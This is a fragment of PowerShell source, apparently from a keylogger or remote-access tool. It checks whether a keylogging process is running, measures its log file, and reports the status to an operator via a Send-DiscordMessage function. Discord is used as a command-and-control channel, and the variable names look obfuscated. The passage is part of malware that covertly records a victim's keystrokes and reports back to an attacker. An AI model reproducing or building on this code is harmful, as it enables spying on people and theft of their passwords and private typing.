                    $Jw1md = if (Test-Path $script:keylogLogFile) { (Get-Item $script:keylogLogFile).Length } else { 0 }
                    Send-DiscordMessage -Content "Running | PID $($ODAUqj.Id) | ${OjA2q}s | log $Jw1md bytes" -ReplyToId $msgId
                } else {
                    $Jw1md = if (Test-Path $script:keylogLogFile) { (Get-Item $script:keylogLogFile).Length } else { 0 }
                    Send-DiscordMessage -Content "Not running | log $Jw1md bytes" -ReplyToId $msgId
                }
